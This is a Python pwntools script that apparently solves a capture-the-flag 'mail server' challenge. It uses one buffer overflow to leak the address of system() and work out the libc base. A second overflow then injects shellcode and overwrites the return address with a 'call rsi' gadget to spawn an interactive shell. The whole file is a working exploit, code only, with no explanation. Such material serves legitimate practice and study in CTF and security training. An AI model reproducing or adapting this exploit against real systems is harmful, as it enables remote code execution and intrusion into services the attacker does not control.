import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000",
                    nargs="?", help="Address of challenge")
args = parser.parse_args()
HOST, PORT = args.address.split(':')
r = remote(HOST, int(PORT))


PATH = '../challenge/build/challenge'
#r = process(PATH, level='debug')
#r = gdb.debug(PATH, level='debug')

context(arch='amd64', os='linux')

r.recvuntil(b'Welcome to the mail server...\n')

# First overflow, get leak
BUFSIZE = 200
payload = b'()' * 60
payload += b'A' * (BUFSIZE - len(payload) - 1)

r.sendline(payload)

recvd = r.recvuntil(b'\n\n')
print(f'1. Received:\n{hexdump(recvd)}')

# calculate libc base
leak = recvd[-8 : -2]
leak += b'\x00' * (8 - len(leak))
system_addr = u64(leak)

system_offset = 0x50d60
libc_base = system_addr - system_offset

print(f'leak={hex(system_addr)}')
print(f'libc={hex(libc_base)}')

# build the payload
offset = 0x000000000002b8ba # call rsi

ret_addr = libc_base + offset
print(f'ret2={hex(ret_addr)}')

import struct
packed_ret = struct.pack('<Q', ret_addr)

# 2nd overflow
OVERFLOWSIZE = 0xd8

payload = asm(shellcraft.linux.sh())
payload += b'()' * 60

remaining_bytes = (OVERFLOWSIZE - len(payload))
payload += b'A' * (remaining_bytes)

payload += packed_ret

r.sendline(payload)

r.interactive()
